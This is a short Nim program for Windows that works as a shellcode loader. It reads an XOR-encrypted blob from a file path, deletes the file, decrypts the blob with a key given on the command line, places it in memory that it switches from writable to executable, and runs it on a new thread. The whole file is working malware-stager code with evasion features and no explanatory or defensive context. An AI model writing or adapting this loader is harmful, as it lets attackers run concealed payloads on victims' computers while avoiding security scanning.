import std/[winlean, os, strutils]

proc virtualAlloc(lpAddress: pointer; dwSize: int; flAllocationType, flProtect: int32): pointer
  {.stdcall, dynlib: "kernel32", importc: "VirtualAlloc".}
proc virtualProtect(lpAddress: pointer; dwSize: int; flNewProtect: int32;
                    lpflOldProtect: ptr int32): WINBOOL
  {.stdcall, dynlib: "kernel32", importc: "VirtualProtect".}
proc createThread(lpAttr: pointer; dwStackSize: int; lpFn, lpParam: pointer;
                  dwFlags: int32; lpTid: ptr int32): Handle
  {.stdcall, dynlib: "kernel32", importc: "CreateThread".}
proc waitForSingleObject(hHandle: Handle; dwMilliseconds: int32): int32
  {.stdcall, dynlib: "kernel32", importc: "WaitForSingleObject".}
proc sleepMs(ms: int32)
  {.stdcall, dynlib: "kernel32", importc: "Sleep".}

proc fromHex(s: string): string =
  result = newString(s.len div 2)
  for i in 0 ..< result.len:
    result[i] = char(parseHexInt(s[i * 2 ..< i * 2 + 2]))

proc xorDecrypt(data, key: string): string =
  result = newString(data.len)
  for i in 0 ..< data.len:
    result[i] = char(uint8(ord(data[i])) xor uint8(ord(key[i mod key.len])))

when isMainModule:
  if paramCount() < 2: quit(1)
  let keyHex = paramStr(1)
  let blobPath = paramStr(2)
  var encBytes: string
  for _ in 0 ..< 15:
    try:
      encBytes = readFile(blobPath)
      break
    except CatchableError:
      sleepMs(300)
  if encBytes.len == 0: quit(1)
  try: removeFile(blobPath) except CatchableError: discard
  let key = fromHex(keyHex)
  let sc = xorDecrypt(encBytes, key)
  let mem = virtualAlloc(nil, sc.len, 0x3000'i32, 0x04'i32)
  if mem == nil: quit(1)
  copyMem(mem, unsafeAddr sc[0], sc.len)
  var old: int32
  discard virtualProtect(mem, sc.len, 0x20'i32, addr old)
  let t = createThread(nil, 0, mem, nil, 0'i32, nil)
  if t == 0: quit(1)
  discard waitForSingleObject(t, 300_000'i32)
